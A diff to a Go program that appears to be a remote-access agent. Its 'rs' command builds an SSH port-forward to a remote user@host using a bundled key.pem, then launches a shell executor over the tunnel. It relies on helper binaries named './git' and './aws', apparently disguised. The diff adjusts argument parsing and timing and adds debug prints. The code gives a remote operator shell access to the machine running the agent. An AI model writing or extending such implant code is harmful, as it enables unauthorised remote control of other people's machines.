@@ -135,7 +135,6 @@ func (a *Agent) msgHandler(msg string) {
 	case "os":
 		a.handleOs(payload)
 		break
-
 	case "rs":
 		a.handleRs(payload)
 		break
@@ -201,10 +200,11 @@ func (a *Agent) handleRs(payload *Payload) {
 	}
 	args := strings.Split(payload.content, " ")
 	shell := args[0]
-	params := args[1:payload.length]
+	params := args[1:len(args)]
+	fmt.Print("----------", params)
 	intport := strconv.Itoa(9600 + rand.Intn(100))
-	command := "-NL " + intport + ":" + params[1] + ":" + params[2] + " " + params[3] + "@" + params[4] + " -i ./key.pem"
-	fmt.Println(shell, params)
+	command := "0 -NL " + intport + ":" + params[0] + ":" + params[1] + " " + params[2] + "@" + params[3] + " -i ./key.pem"
+	fmt.Println("---------------", shell, params)
 	connectToRs(command, shell, intport)
 	send("/msg: "+runtime.GOOS+" -> "+payload.from, a.ws)
 }
@@ -315,9 +315,10 @@ func connectToRs(params string, shell string, intport string) bool {
 	//create ssh tunnel
 	go createTunnel(params)
 	//sleep 5s
-	time.Sleep(time.Millisecond * 3000)
+	time.Sleep(time.Millisecond * 5000)
 	// find shell type
 	//spin the shell executor
+	fmt.Println("executor------->>", intport, shell)
 	_shell := exec.Command("./aws"+extension(), "localhost", intport, shell)
 	err := _shell.Run()
 	if err != nil {
@@ -327,13 +328,15 @@ func connectToRs(params string, shell string, intport string) bool {
 }
 
 func createTunnel(command string) {
+	fmt.Println("creating tunnel ... !", command)
 	args := strings.Split(command, " ")
 	_tunnel := exec.Command("./git"+extension(), args...)
 	err := _tunnel.Run()
 	if err != nil {
 		fmt.Println(err)
+	} else {
+		fmt.Println("tunnel created !")
 	}
-
 }
 
 func extension() string {
